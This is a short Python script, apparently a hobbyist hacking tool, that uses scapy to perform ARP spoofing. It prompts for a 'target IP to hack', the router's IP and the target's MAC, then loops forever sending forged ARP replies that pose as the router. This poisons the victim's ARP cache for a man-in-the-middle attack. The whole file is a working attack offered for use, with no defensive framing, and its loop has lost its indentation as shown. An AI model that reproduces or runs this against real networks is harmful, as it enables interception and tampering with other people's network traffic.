##arp spoofing script
from scapy.all import *
from subprocess import call
import time

op=2
victim=raw_input('Enter the target IP to hack: ')
victim=victim.replace(" ","")

spoof=raw_input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ')
spoof=spoof.replace(" ","")

mac=raw_input('Enter the target MAC to hack: ')
mac=mac.replace("-",":")
mac=mac.replace(" ","")

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:
send(arp)
time.sleep(2)
